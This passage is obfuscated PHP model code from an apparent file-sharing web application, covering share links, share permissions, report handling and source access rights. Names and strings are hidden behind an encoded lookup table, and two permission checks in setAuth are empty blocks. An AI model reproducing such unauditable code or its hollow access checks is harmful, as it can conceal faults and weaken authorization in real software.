$£§şé¿¦[91] && $ÊæÀì €[$£§şé¿¦[692]] == $£§şé¿¦[229]) { $ãæŠôÈ• = $£§şé¿¦[2284]; } Model($£§şé¿¦[662])->eventShare($èö¾»ªÌ, $ãæŠôÈ•); return; } private function _addShareData($€‰À¼îù, $›äç¾Ü• = array(), $ÒÅÈÑ‡ = false) { $±ßĞ«¤‘ =& $_SERVER[€ä¾™²]; $Î°Ì¼Ö¥ = $ÒÅÈÑ‡ == $±ßĞ«¤‘[190] ? 0 : USER_ID; $‰·ˆÀÆ = array($±ßĞ«¤‘[513] => $€‰À¼îù, $±ßĞ«¤‘[1913] => $Î°Ì¼Ö¥); if ($€‰À¼îù == 0) { $‰·ˆÀÆ = array($±ßĞ«¤‘[2285] => $›äç¾Ü•[$±ßĞ«¤‘[590]], $±ßĞ«¤‘[1913] => $Î°Ì¼Ö¥); } if ($­·¸û = $this->where($‰·ˆÀÆ)->find()) { return $­·¸û[$±ßĞ«¤‘[694]]; } if ($€‰À¼îù == 0) { $Ğ­´üÒƒ = array($±ßĞ«¤‘[32] => get_path_this($›äç¾Ü•[$±ßĞ«¤‘[87]])); } else { $Ğ­´üÒƒ = Model($±ßĞ«¤‘[932])->sourceInfo($€‰À¼îù); if (!$Ğ­´üÒƒ) { return !1; } } if (!$›äç¾Ü•[$±ßĞ«¤‘[1810]]) { $›äç¾Ü•[$±ßĞ«¤‘[1810]] = $Ğ­´üÒƒ[$±ßĞ«¤‘[32]]; } $º¬®œ‡¡ = array($±ßĞ«¤‘[1913] => $Î°Ì¼Ö¥, $±ßĞ«¤‘[513] => $€‰À¼îù, $±ßĞ«¤‘[1810] => $±ßĞ«¤‘[12], $±ßĞ«¤‘[585] => 0, $±ßĞ«¤‘[692] => 0, $±ßĞ«¤‘[590] => $±ßĞ«¤‘[12], $±ßĞ«¤‘[383] => $±ßĞ«¤‘[12], $±ßĞ«¤‘[999] => $±ßĞ«¤‘[12], $±ßĞ«¤‘[2286] => 0, $±ßĞ«¤‘[2287] => 0, $±ßĞ«¤‘[862] => 0, $±ßĞ«¤‘[587] => $±ßĞ«¤‘[12], $±ßĞ«¤‘[1501] => $±ßĞ«¤‘[12]); $†ŒŞÜÜâ = explode($±ßĞ«¤‘[50], $±ßĞ«¤‘[2288]); foreach ($†ŒŞÜÜâ as $üÆö–ÆÍ) { if (!isset($›äç¾Ü•[$üÆö–ÆÍ])) { continue; } $º¬®œ‡¡[$üÆö–ÆÍ] = $›äç¾Ü•[$üÆö–ÆÍ]; } $²ÙóÈŞ = $this->add($º¬®œ‡¡); $«¢àî¹ = array($±ßĞ«¤‘[1501] => short_id($²ÙóÈŞ)); if ($this->where($«¢àî¹)->find()) { $«¢àî¹[$±ßĞ«¤‘[1501]] .= $±ßĞ«¤‘[476] . rand_string(2, 3); } $this->where(array($±ßĞ«¤‘[2289] => $²ÙóÈŞ))->save($«¢àî¹); return $²ÙóÈŞ; } private function _shareAuthSet($·ÁÜÏšø, $İÂ·áú›) { $•ïáí€© =& $_SERVER[€ä¾™²]; if (!is_array($İÂ·áú›)) { return !1; } $œ‡òî½„ = Model($•ïáí€©[2237]); $œ‡òî½„->where(array($•ïáí€©[694] => $·ÁÜÏšø))->delete(); $á·Úâ…‹ = array(); foreach ($İÂ·áú› as $Ç­ò¸©ª) { $”èë‚»¾ = SourceModel::TYPE_USER; if ($Ç­ò¸©ª[$•ïáí€©[189]] == SourceModel::TYPE_GROUP) { $”èë‚»¾ = SourceModel::TYPE_GROUP; } $÷¥´ú = array($•ïáí€©[694] => $·ÁÜÏšø, $•ïáí€©[189] => $”èë‚»¾, $•ïáí€©[596] => intval($Ç­ò¸©ª[$•ïáí€©[596]]), $•ïáí€©[1586] => 0, $•ïáí€©[2290] => -1); if ($Ç­ò¸©ª[$•ïáí€©[1586]]) { $÷¥´ú[$•ïáí€©[1586]] = $Ç­ò¸©ª[$•ïáí€©[1586]]; } else { if ($Ç­ò¸©ª[$•ïáí€©[2290]]) { $÷¥´ú[$•ïáí€©[2290]] = $Ç­ò¸©ª[$•ïáí€©[2290]]; } } $á·Úâ…‹[] = $÷¥´ú; } return $œ‡òî½„->addAll($á·Úâ…‹, array(), !0); } public function numViewAdd($Æ¢³¿Ú) { $…³Ôàšî =& $_SERVER[€ä¾™²]; $íŠñÅÀ = array($…³Ôàšî[2289] => $Æ¢³¿Ú); $this->where($íŠñÅÀ)->setAdd($…³Ôàšî[2286]); } public function numDownloadAdd($Àò–ĞÛ) { $ÏéÄğî =& $_SERVER[€ä¾™²]; $„º™«èê = array($ÏéÄğî[2289] => $Àò–ĞÛ); $this->where($„º™«èê)->setAdd($ÏéÄğî[2287]); } protected function shareEdit($£§Ş²Áõ, $ïÆ×Ôø¡) { $ŸêÈßã‹ =& $_SERVER[€ä¾™²]; $Âé©½¯ = $this->getInfo($£§Ş²Áõ); if (!$Âé©½¯) { return !1; } if ($ïÆ×Ôø¡[$ŸêÈßã‹[1501]] && $ïÆ×Ôø¡[$ŸêÈßã‹[585]] == $ŸêÈßã‹[91]) { if ($ïÆ×Ôø¡[$ŸêÈßã‹[1501]] == $Âé©½¯[$ŸêÈßã‹[1501]]) { unset($ïÆ×Ôø¡[$ŸêÈßã‹[1501]]); } if ($ïÆ×Ôø¡[$ŸêÈßã‹[1501]]) { $½ˆ£óâò = $this->where(array($ŸêÈßã‹[2291] => $ïÆ×Ôø¡[$ŸêÈßã‹[1501]]))->find(); if ($½ˆ£óâò) { return !1; } if (!is_array($ïÆ×Ôø¡[$ŸêÈßã‹[587]])) { $ïÆ×Ôø¡[$ŸêÈßã‹[587]] = is_array($Âé©½¯[$ŸêÈßã‹[587]]) ? $Âé©½¯[$ŸêÈßã‹[587]] : array(); } if (!$ïÆ×Ôø¡[$ŸêÈßã‹[587]][$ŸêÈßã‹[2292]]) { $ïÆ×Ôø¡[$ŸêÈßã‹[587]][$ŸêÈßã‹[2292]] = $Âé©½¯[$ŸêÈßã‹[1501]]; $ïÆ×Ôø¡[$ŸêÈßã‹[587]][$ŸêÈßã‹[2293]] = $ŸêÈßã‹[91]; } } } $this->_checkLinkShare($ïÆ×Ôø¡, $Âé©½¯); $¼ï§®Úê = array(); $¦µˆ¸úí = explode($ŸêÈßã‹[50], $ŸêÈßã‹[2294]); foreach ($¦µˆ¸úí as $åôÎÂ‚î) { if (!array_key_exists($åôÎÂ‚î, $ïÆ×Ôø¡)) { continue; } $¼ï§®Úê[$åôÎÂ‚î] = $ïÆ×Ôø¡[$åôÎÂ‚î]; } $this->shareEventAdd($Âé©½¯[$ŸêÈßã‹[192]], $ïÆ×Ôø¡, $ŸêÈßã‹[1508]); $this->where(array($ŸêÈßã‹[2289] => $£§Ş²Áõ))->save($¼ï§®Úê); if (isset($ïÆ×Ôø¡[$ŸêÈßã‹[2278]])) { $this->_shareAuthSet($£§Ş²Áõ, $ïÆ×Ôø¡[$ŸêÈßã‹[2278]]); } return !0; } private function _checkLinkShare($”—æÌÙ‹, $¹œ¦ìşÀ) { $§ŒªÀ­ =& $_SERVER[€ä¾™²]; if ($”—æÌÙ‹[$§ŒªÀ­[585]] != $§ŒªÀ­[91]) { return; } $€‘¦¥Ò˜ = $¹œ¦ìşÀ[$§ŒªÀ­[90]][$§ŒªÀ­[192]]; if ($¹œ¦ìşÀ[$§ŒªÀ­[90]][$§ŒªÀ­[33]] != $§ŒªÀ­[231]) { $ìöŠ¶³‚ = $this->_folderReport($€‘¦¥Ò˜); if (!$ìöŠ¶³‚) { return; } show_json(LNG($§ŒªÀ­[2295]) . $§ŒªÀ­[2296] . $ìöŠ¶³‚, !1); } $±Ş±¸ø¶ = Model($§ŒªÀ­[932])->fileInfoGet($¹œ¦ìşÀ[$§ŒªÀ­[90]][$§ŒªÀ­[192]]); if (!$±Ş±¸ø¶) { return; } $Œµµ˜·İ = $this->shareFileMeta($±Ş±¸ø¶[$§ŒªÀ­[564]]); if (isset($Œµµ˜·İ[$§ŒªÀ­[451]]) && $Œµµ˜·İ[$§ŒªÀ­[451]] == $§ŒªÀ­[91]) { show_json(LNG($§ŒªÀ­[2297]), !1); } } private function _folderReport($ù¹Á„±ø) { $âÈ™Ç°“ =& $_SERVER[€ä¾™²]; $ÌÎ–úœ¡ = array($âÈ™Ç°“[564] => array($âÈ™Ç°“[1125], 0), $âÈ™Ç°“[850] => 3); $ñ—Ú­Â = Model($âÈ™Ç°“[2298])->where($ÌÎ–úœ¡)->field($âÈ™Ç°“[564])->select(); if (!$ñ—Ú­Â) { return !1; } $ñ—Ú­Â = array_to_keyvalue($ñ—Ú­Â, $âÈ™Ç°“[12], $âÈ™Ç°“[564]); $ŒÓ…üäÁ = $âÈ™Ç°“[50] . $ù¹Á„±ø . $âÈ™Ç°“[50]; $ÌÎ–úœ¡ = array($âÈ™Ç°“[564] => array($âÈ™Ç°“[7], $ñ—Ú­Â), $âÈ™Ç°“[611] => array($âÈ™Ç°“[473], "\x25{$ŒÓ…üäÁ}\x25"), $âÈ™Ç°“[527] => 0); $˜Òï—ÏÄ = Model($âÈ™Ç°“[932])->where($ÌÎ–úœ¡)->field($âÈ™Ç°“[2299])->find(); if (!$˜Òï—ÏÄ) { return !1; } $ğ³í¬¸ = substr($˜Òï—ÏÄ[$âÈ™Ç°“[611]], strpos($˜Òï—ÏÄ[$âÈ™Ç°“[611]], $ŒÓ…üäÁ)); $ÌÎ–úœ¡ = array($âÈ™Ç°“[192] => array($âÈ™Ç°“[7], trim($ğ³í¬¸, $âÈ™Ç°“[50]))); $Å’òù¿´ = Model($âÈ™Ç°“[932])->where($ÌÎ–úœ¡)->field($âÈ™Ç°“[32])->select(); $ÄìÓÒá = array_to_keyvalue($Å’òù¿´, $âÈ™Ç°“[12], $âÈ™Ç°“[32]); $ÄìÓÒá[] = $˜Òï—ÏÄ[$âÈ™Ç°“[32]]; return implode($âÈ™Ç°“[8], $ÄìÓÒá); } protected function remove($ÚãîĞ”à) { $±û†ıªâ =& $_SERVER[€ä¾™²]; $œ“‘Ë¾ = is_array($ÚãîĞ”à) ? $ÚãîĞ”à : array($ÚãîĞ”à); for ($íÅ ÷å‹ = 0; $íÅ ÷å‹ < count($œ“‘Ë¾); $íÅ ÷å‹++) { $Òş´¦ö = $this->getInfo($œ“‘Ë¾[$íÅ ÷å‹]); if ($Òş´¦ö[$±û†ıªâ[692]] == $±û†ıªâ[91]) { Model($±û†ıªâ[662])->eventShare($Òş´¦ö[$±û†ıªâ[192]], $±û†ıªâ[2284]); } if ($Òş´¦ö[$±û†ıªâ[585]] == $±û†ıªâ[91]) { Model($±û†ıªâ[662])->eventShare($Òş´¦ö[$±û†ıªâ[192]], $±û†ıªâ[2283]); } } $û²¢­§â = array($±û†ıªâ[694] => array($±û†ıªâ[7], $œ“‘Ë¾)); $±¨‹Ùâ¶ = $this->where($û²¢­§â)->delete(); if ($±¨‹Ùâ¶) { Model($±û†ıªâ[695])->where($û²¢­§â)->delete(); } return $±¨‹Ùâ¶; } protected function removeBySource($ìüø²êà) { $ÌÑäÔ =& $_SERVER[€ä¾™²]; $Û”µˆé˜ = array($ÌÑäÔ[513] => array($ÌÑäÔ[514], $ìüø²êà)); $–õº = $this->field($ÌÑäÔ[694])->where($Û”µˆé˜)->select(); $§ì½şÉ» = array_to_keyvalue($–õº, $ÌÑäÔ[12], $ÌÑäÔ[694]); if (!$§ì½şÉ») { return; } foreach ($–õº as $‚ö¦ØâÕ) { $this->cacheFunctionClear($ÌÑäÔ[2300], $‚ö¦ØâÕ[$ÌÑäÔ[694]]); } $Û”µˆé˜ = array($ÌÑäÔ[2289] => array($ÌÑäÔ[514], $§ì½şÉ»)); $this->where($Û”µˆé˜)->delete(); Model($ÌÑäÔ[695])->where($Û”µˆé˜)->delete(); } public function listAll($ëŒğ¨¼) { $ÚÙÏÖÍ€ =& $_SERVER[€ä¾™²]; $ÍÔ¬Œ­ = array(); if ($ëŒğ¨¼[$ÚÙÏÖÍ€[1539]]) { $ÍÔ¬Œ­[$ÚÙÏÖÍ€[1539]] = $ëŒğ¨¼[$ÚÙÏÖÍ€[1539]]; } if ($ëŒğ¨¼[$ÚÙÏÖÍ€[861]]) { $€ù²¢¾Ş = $ëŒğ¨¼[$ÚÙÏÖÍ€[862]] ? $ëŒğ¨¼[$ÚÙÏÖÍ€[862]] : strtotime(date($ÚÙÏÖÍ€[2301])); $ÍÔ¬Œ­[$ÚÙÏÖÍ€[232]] = array($ÚÙÏÖÍ€[409], array($ëŒğ¨¼[$ÚÙÏÖÍ€[861]], $€ù²¢¾Ş)); } if ($ëŒğ¨¼[$ÚÙÏÖÍ€[33]]) { $ÍÔ¬Œ­[$ëŒğ¨¼[$ÚÙÏÖÍ€[33]]] = 1; } else { $ÍÔ¬Œ­[] = array($ÚÙÏÖÍ€[585] => array($ÚÙÏÖÍ€[1125], 0), $ÚÙÏÖÍ€[692] => array($ÚÙÏÖÍ€[1125], 0), $ÚÙÏÖÍ€[2272] => $ÚÙÏÖÍ€[2228]); } if ($ëŒğ¨¼[$ÚÙÏÖÍ€[2224]]) { $ÍÔ¬Œ­[] = array($ÚÙÏÖÍ€[1501] => $ëŒğ¨¼[$ÚÙÏÖÍ€[2224]], $ÚÙÏÖÍ€[1810] => array($ÚÙÏÖÍ€[473], "\x25{$ëŒğ¨¼[$ÚÙÏÖÍ€[2224]]}\45"), $ÚÙÏÖÍ€[2272] => $ÚÙÏÖÍ€[2228]); } $ §áëÎª = $this->_makeOrder()->where($ÍÔ¬Œ­)->selectPage(20); if (empty($ §áëÎª[$ÚÙÏÖÍ€[446]])) { return array(); } $this->_listDataApply($ §áëÎª[$ÚÙÏÖÍ€[446]]); return $ §áëÎª; } public function listDataApply($Ó¢ñá‰) { $this->_listDataApply($Ó¢ñá‰); return $Ó¢ñá‰; } private function _listDataApply(&$¼¬ôğ¸) { $Ëˆ˜ÆßË =& $_SERVER[€ä¾™²]; $Ùá–¢‹© = array_to_keyvalue($¼¬ôğ¸, $Ëˆ˜ÆßË[12], $Ëˆ˜ÆßË[1539]); $Ã¹ã‘ÙÎ = Model($Ëˆ˜ÆßË[624])->userListInfo(array_unique($Ùá–¢‹©)); $Ôó™„äÎ = array_to_keyvalue($¼¬ôğ¸, $Ëˆ˜ÆßË[12], $Ëˆ˜ÆßË[192]); $ó°µğ…ü = Model($Ëˆ˜ÆßË[932])->sourceListInfo($Ôó™„äÎ, !0); foreach ($¼¬ôğ¸ as $âÆ—˜û¶ => &$´³µêÂ) { $´ÚßÚ = $´³µêÂ[$Ëˆ˜ÆßË[1539]]; $´³µêÂ[$Ëˆ˜ÆßË[2302]] = $Ã¹ã‘ÙÎ[$´ÚßÚ] ? $Ã¹ã‘ÙÎ[$´ÚßÚ] : !1; if (!$´³µêÂ[$Ëˆ˜ÆßË[2302]] || $´³µêÂ[$Ëˆ˜ÆßË[2302]][$Ëˆ˜ÆßË[850]] != $Ëˆ˜ÆßË[91]) { unset($¼¬ôğ¸[$âÆ—˜û¶]); continue; } $•´­Àúã = $´³µêÂ[$Ëˆ˜ÆßË[192]]; $´³µêÂ[$Ëˆ˜ÆßË[90]] = $ó°µğ…ü[$•´­Àúã] ? $ó°µğ…ü[$•´­Àúã] : !1; if ($´³µêÂ[$Ëˆ˜ÆßË[90]][$Ëˆ˜ÆßË[527]] == $Ëˆ˜ÆßË[91]) { unset($¼¬ôğ¸[$âÆ—˜û¶]); } if ($´³µêÂ[$Ëˆ˜ÆßË[90]] != $Ëˆ˜ÆßË[229] && !$´³µêÂ[$Ëˆ˜ÆßË[90]]) { unset($¼¬ôğ¸[$âÆ—˜û¶]); } } unset($´³µêÂ); $¼¬ôğ¸ = array_values($¼¬ôğ¸); } private function _makeOrder($ó¨öóñ = '') { $•àÍøæ =& $_SERVER[€ä¾™²]; $ÛûŠ¯Ÿ = array($•àÍøæ[232], $•àÍøæ[862], $•àÍøæ[2286], $•àÍøæ[2287]); $‡¿î•Ÿ = array($•àÍøæ[544] => $•àÍøæ[545], $•àÍøæ[546] => $•àÍøæ[547]); $î’”„éÊ = Input::get($•àÍøæ[551], $•àÍøæ[7], $•àÍøæ[519], $ÛûŠ¯Ÿ); $æ©šçÅ¾ = Input::get($•àÍøæ[552], $•àÍøæ[7], $•àÍøæ[2303], array($•àÍøæ[2221], $•àÍøæ[546])); $æ©šçÅ¾ = $‡¿î•Ÿ[$æ©šçÅ¾]; $ó¨öóñ = $ó¨öóñ . "{$î’”„éÊ}\40{$æ©šçÅ¾}"; return $this->order($ó¨öóñ); } public function reportAdd($¬Àå¦½Ì) { $ï©Ñš¼Ï =& $_SERVER[€ä¾™²]; $ğŒÊ‚Á¼ = array($ï©Ñš¼Ï[694] => $¬Àå¦½Ì[$ï©Ñš¼Ï[694]], $ï©Ñš¼Ï[1539] => USER_ID); if (Model($ï©Ñš¼Ï[2298])->where($ğŒÊ‚Á¼)->find()) { return !1; } $ïïÕÙºƒ = array($ï©Ñš¼Ï[694] => $¬Àå¦½Ì[$ï©Ñš¼Ï[694]], $ï©Ñš¼Ï[1810] => $¬Àå¦½Ì[$ï©Ñš¼Ï[1810]], $ï©Ñš¼Ï[192] => $¬Àå¦½Ì[$ï©Ñš¼Ï[192]], $ï©Ñš¼Ï[564] => $¬Àå¦½Ì[$ï©Ñš¼Ï[564]], $ï©Ñš¼Ï[1539] => USER_ID, $ï©Ñš¼Ï[33] => $¬Àå¦½Ì[$ï©Ñš¼Ï[33]], $ï©Ñš¼Ï[547] => $¬Àå¦½Ì[$ï©Ñš¼Ï[547]]); return Model($ï©Ñš¼Ï[2298])->add($ïïÕÙºƒ); } public function reportList($²­§‡êÖ) { $®¡êä¨ =& $_SERVER[€ä¾™²]; $×ˆ…¸·Ó = array(); if ($²­§‡êÖ[$®¡êä¨[861]]) { $Ëè½¼¾¤ = $²­§‡êÖ[$®¡êä¨[862]] ? $²­§‡êÖ[$®¡êä¨[862]] : strtotime(date($®¡êä¨[2301])); $×ˆ…¸·Ó[$®¡êä¨[232]] = array($®¡êä¨[409], array($²­§‡êÖ[$®¡êä¨[861]], $Ëè½¼¾¤)); } if (isset($²­§‡êÖ[$®¡êä¨[33]]) && in_array($²­§‡êÖ[$®¡êä¨[33]], array($®¡êä¨[91], $®¡êä¨[531], $®¡êä¨[2304], $®¡êä¨[2305], $®¡êä¨[2306]))) { $×ˆ…¸·Ó[$®¡êä¨[33]] = $²­§‡êÖ[$®¡êä¨[33]]; } if (isset($²­§‡êÖ[$®¡êä¨[850]]) && in_array($²­§‡êÖ[$®¡êä¨[850]], array($®¡êä¨[229], $®¡êä¨[91], $®¡êä¨[531], $®¡êä¨[2304]))) { $×ˆ…¸·Ó[$®¡êä¨[850]] = $²­§‡êÖ[$®¡êä¨[850]]; } $¶Ù²›ªâ = Input::get($®¡êä¨[552], $®¡êä¨[7], $®¡êä¨[2303], array($®¡êä¨[2221], $®¡êä¨[546])); $ùòÇÍç‡ = array($®¡êä¨[544] => $®¡êä¨[545], $®¡êä¨[546] => $®¡êä¨[547]); $±åëğç™ = $®¡êä¨[2307] . $ùòÇÍç‡[$¶Ù²›ªâ]; $•ÌÂ¤Ûİ = Model($®¡êä¨[2298])->where($×ˆ…¸·Ó)->order($±åëğç™)->selectPage(20); if (empty($•ÌÂ¤Ûİ[$®¡êä¨[446]])) { return array(); } $Ú·İÛ”Ã = array_to_keyvalue_group($•ÌÂ¤Ûİ[$®¡êä¨[446]], $®¡êä¨[850], $®¡êä¨[694]); if (!empty($Ú·İÛ”Ã[0])) { $²­§‡êÖ = $Ú·İÛ”Ã[0]; $×ˆ…¸·Ó = array($®¡êä¨[694] => array($®¡êä¨[7], $²­§‡êÖ)); $­ûÈµÑ™ = $this->where($×ˆ…¸·Ó)->field($®¡êä¨[694])->select(); $­ûÈµÑ™ = array_to_keyvalue($­ûÈµÑ™, $®¡êä¨[12], $®¡êä¨[694]); $ÀéÖ¦Úæ = array_diff($²­§‡êÖ, $­ûÈµÑ™); if (!empty($ÀéÖ¦Úæ)) { foreach ($•ÌÂ¤Ûİ[$®¡êä¨[446]] as $«’ë¨û³ => $ÛÒ¨¿Ø§) { if (in_array($ÛÒ¨¿Ø§[$®¡êä¨[694]], $ÀéÖ¦Úæ)) { unset($•ÌÂ¤Ûİ[$®¡êä¨[446]][$«’ë¨û³]); } } } } $this->_listDataApply($•ÌÂ¤Ûİ[$®¡êä¨[446]]); return $•ÌÂ¤Ûİ; } public function reportStatus($š÷âöìö) { $ùï¨ó»³ =& $_SERVER[€ä¾™²]; $ŸÀÁû¡ = array($ùï¨ó»³[486] => $š÷âöìö[$ùï¨ó»³[486]]); $…ÖÁöÖÙ = Model($ùï¨ó»³[2298])->where($ŸÀÁû¡)->field($ùï¨ó»³[2308])->find(); if (!$…ÖÁöÖÙ) { return !1; } $ş„¯šâå = array($ùï¨ó»³[850] => $š÷âöìö[$ùï¨ó»³[850]]); if ($š÷âöìö[$ùï¨ó»³[850]] == $ùï¨ó»³[2304] && $…ÖÁöÖÙ[$ùï¨ó»³[850]] == $ùï¨ó»³[2304]) { $ş„¯šâå[$ùï¨ó»³[850]] = 0; } $¼«×œÏ“ = Model($ùï¨ó»³[2298])->where($ŸÀÁû¡)->save($ş„¯šâå); if ($š÷âöìö[$ùï¨ó»³[850]] == $ùï¨ó»³[531]) { if ($…ÖÁöÖÙ[$ùï¨ó»³[564]] != $ùï¨ó»³[229] && $this->shareFileMeta($…ÖÁöÖÙ[$ùï¨ó»³[564]])) { $this->shareFileMeta($…ÖÁöÖÙ[$ùï¨ó»³[564]], 0); } $this->remove($…ÖÁöÖÙ[$ùï¨ó»³[694]]); return !0; } if ($¼«×œÏ“ && $š÷âöìö[$ùï¨ó»³[850]] == $ùï¨ó»³[2304]) { $Õ­†Ï = $ş„¯šâå[$ùï¨ó»³[850]] == $ùï¨ó»³[2304] ? 1 : 0; $this->shareFileMeta($…ÖÁöÖÙ[$ùï¨ó»³[564]], $Õ­†Ï); $this->removeByFile($…ÖÁöÖÙ[$ùï¨ó»³[564]]); } return $¼«×œÏ“; } private function removeByFile($îÄºâ…’) { $Ü‚ËÂêÀ =& $_SERVER[€ä¾™²]; $ĞÒÒŒÊæ = Model($Ü‚ËÂêÀ[932])->where(array($Ü‚ËÂêÀ[564] => $îÄºâ…’))->field($Ü‚ËÂêÀ[192])->select(); $¾§İçŸ¢ = array_to_keyvalue($ĞÒÒŒÊæ, $Ü‚ËÂêÀ[12], $Ü‚ËÂêÀ[192]); $ïÜİÔ–á = array($Ü‚ËÂêÀ[192] => array($Ü‚ËÂêÀ[7], $¾§İçŸ¢), $Ü‚ËÂêÀ[585] => 1); $ĞÒÒŒÊæ = $this->where($ïÜİÔ–á)->field($Ü‚ËÂêÀ[694])->select(); if (empty($ĞÒÒŒÊæ)) { return; } $ÆÍûé³¨ = array_to_keyvalue($ĞÒÒŒÊæ, $Ü‚ËÂêÀ[12], $Ü‚ËÂêÀ[694]); $this->remove($ÆÍûé³¨); } private function shareFileMeta($³æš–š¨, $˜¤Ìºê = null) { $ˆœù òû =& $_SERVER[€ä¾™²]; $ ºœœË = array($ˆœù òû[564] => $³æš–š¨, $ˆœù òû[95] => $ˆœù òû[2309]); if (is_null($˜¤Ìºê)) { return Model($ˆœù òû[2310])->where($ ºœœË)->find(); } $ ºœœË[$ˆœù òû[451]] = $˜¤Ìºê; Model($ˆœù òû[2310])->add($ ºœœË, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\x63\145\x5f\x61\x75\x74\150"; public function getAuth($Ûß—“‰š) { $›˜º§Õ =& $_SERVER[€ä¾™²]; $¿ê‹Öí = $this->sourceAuthSelect($Ûß—“‰š); $È³³øÑ = array(); $˜µ¡¿ ¦ = array(); $‰˜­ä“ = 2 << 25; foreach ($¿ê‹Öí as $ş¶°¯ìØ) { $¦›Ÿ‚äÙ = Model($›˜º§Õ[598])->listData($ş¶°¯ìØ[$›˜º§Õ[1586]]); if (!$¦›Ÿ‚äÙ) { continue; } $È³³øÑ[] = $ş¶°¯ìØ; $ÒêŠ¦€š = 0; if ($ş¶°¯ìØ[$›˜º§Õ[189]] == SourceModel::TYPE_GROUP) { $ÒêŠ¦€š = $‰˜­ä“ * 2; } if ($ş¶°¯ìØ[$›˜º§Õ[189]] == SourceModel::TYPE_USER) { $ÒêŠ¦€š = $‰˜­ä“; } if ($ş¶°¯ìØ[$›˜º§Õ[189]] == SourceModel::TYPE_USER && $ş¶°¯ìØ[$›˜º§Õ[596]] == $›˜º§Õ[229]) { $ÒêŠ¦€š = 0; } $˜µ¡¿ ¦[] = $¦›Ÿ‚äÙ[$›˜º§Õ[509]] + $ÒêŠ¦€š; } array_multisort($˜µ¡¿ ¦, SORT_DESC, $È³³øÑ); return $È³³øÑ; } public function sourceAuthSelect($€ æÄ«) { $Óá—–² =& $_SERVER[€ä¾™²]; static $’³ø„È‹ = array(); $¢áœÜö² = is_array($€ æÄ«) ? !1 : !0; if ($¢áœÜö²) { $€ æÄ« = array($€ æÄ«); } $›·šÒŞ÷ = array(); foreach ($€ æÄ« as $Ò×îÑş‡) { if (isset($’³ø„È‹[$Ò×îÑş‡])) { $›·šÒŞ÷[$Ò×îÑş‡] = $’³ø„È‹[$Ò×îÑş‡]; } } if (count($›·šÒŞ÷) == count($€ æÄ«)) { return $¢áœÜö² ? $›·šÒŞ÷[$€ æÄ«[0]] : $›·šÒŞ÷; } $‡—–û— = $Óá—–²[2311]; $¢ ã©®õ = array($Óá—–²[192] => array($Óá—–²[7], $€ æÄ«)); $Š«‘ç°À = $this->field($‡—–û—)->order($Óá—–²[486])->where($¢ ã©®õ)->select(); $ÃÆû˜±× = array_to_keyvalue_group($Š«‘ç°À, $Óá—–²[192]); foreach ($€ æÄ« as $Ò×îÑş‡) { $’³ø„È‹[$Ò×îÑş‡] = $ÃÆû˜±×[$Ò×îÑş‡] ? $ÃÆû˜±×[$Ò×îÑş‡] : array(); } if ($¢áœÜö²) { return $Š«‘ç°À; } return $ÃÆû˜±×; } public function setAuth($Í×İÙ, $¨ÅÁÇ²) { $ò÷€Í†ö =& $_SERVER[€ä¾™²]; $İ¸ÓÓ×Å = Model($ò÷€Í†ö[1479])->sourceInfo($Í×İÙ); if (!$İ¸ÓÓ×Å) { return !1; } if ($İ¸ÓÓ×Å[$ò÷€Í†ö[189]] != SourceModel::TYPE_GROUP) { return !1; } $¿ûØçŸ˜ = 1; $¿·ÖŸ˜ = $İ¸ÓÓ×Å[$ò÷€Í†ö[596]]; if ($¿·ÖŸ˜ != $¿ûØçŸ˜) { $÷øƒçä÷ = array($ò÷€Í†ö[1441] => $¿·ÖŸ˜); $µáà™ñ† = Model($ò÷€Í†ö[2220])->field($ò÷€Í†ö[1539])->where($÷øƒçä÷)->select(); $µáà™ñ† = array_to_keyvalue($µáà™ñ†, $ò÷€Í†ö[12], $ò÷€Í†ö[1539]); } $×äªç°€ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $·Û“üà = array(); foreach ($¨ÅÁÇ² as $œİ»½•Ë) { if (!in_array($œİ»½•Ë[$ò÷€Í†ö[189]], $×äªç°€)) { show_json(LNG($ò÷€Í†ö[2312]), !1); } if ($¿·ÖŸ˜ != $¿ûØçŸ˜) { if ($œİ»½•Ë[$ò÷€Í†ö[189]] == SourceModel::TYPE_GROUP) { } if ($œİ»½•Ë[$ò÷€Í†ö[596]] != 0 && !in_array($œİ»½•Ë[$ò÷€Í†ö[596]], $µáà™ñ†)) { } } if ($œİ»½•Ë[$ò÷€Í†ö[596]] == 0) { $œİ»½•Ë[$ò÷€Í†ö[189]] = SourceModel::TYPE_USER; } $·Û“üà[] = array($ò÷€Í†ö[192] => $Í×İÙ, $ò÷€Í†ö[189] => intval($œİ»½•Ë[$ò÷€Í†ö[189]]), $ò÷€Í†ö[596] => intval($œİ»½•Ë[$ò÷€Í†ö[596]]), $ò÷€Í†ö[1586] => intval($œİ»½•Ë[$ò÷€Í†ö[1586]]) ? intval($œİ»½•Ë[$ò÷€Í†ö[1586]]) : 0, $ò÷€Í†ö[2290] => intval($œİ»½•Ë[$ò÷€Í†ö[2290]]) ? intval($œİ»½•Ë[$ò÷€Í†ö[2290]]) : -1); } $this->where(array($ò÷€Í†ö[513] => $Í×İÙ))->delete(); $this->addAll($·Û“üà); return !0; } public function authClear($ª·µ…Ôå) { $¹áğ¬‹é =& $_SERVER[€ä¾™²]; $Ê¶¹Ó™¦ = Model($¹áğ¬‹é[1479])->sourceInfo($ª·µ…Ôå); $ƒ˜ÅªÑ“ = array($ª·µ…Ôå); if ($Ê¶¹Ó™¦[$¹áğ¬‹é[507]] == $¹áğ¬‹é[91]) { $Ê¸ª›ë¢ = array($¹áğ¬‹é[681] => array($¹áğ¬‹é[642], $Ê¶¹Ó™¦[$¹áğ¬‹é[611]] . $ª·µ…Ôå . $¹áğ¬‹é[643])); $ƒ˜ÅªÑ“ = Model($¹áğ¬‹é[1479])->field($¹áğ¬‹é[513])->where($Ê¸ª›ë¢)->getField($¹áğ¬‹é[192], !0); $ƒ˜ÅªÑ“[] = $ª·µ…Ôå; } $this->where(array($¹áğ¬‹é[513] => array($¹áğ¬‹é[514], $ƒ˜ÅªÑ“)))->delete(); return !0; } public function getAllParent($„«—Êºî) { $¾¼ˆŸÓ =& $_SERVER[€ä¾™²]; $†ùÉæ¤³ = Model($¾¼ˆŸÓ[1479])->sourceInfo($„«—Êºî); if (!$†ùÉæ¤³ || $†ùÉæ¤³[$¾¼ˆŸÓ[189]] != SourceModel::TYPE_GROUP) { return array(); } $ºûüûŸš = Model($¾¼ˆŸÓ[1479])->parentLevelArray($†ùÉæ¤³[$¾¼ˆŸÓ[611]]); $øæ°–ï = 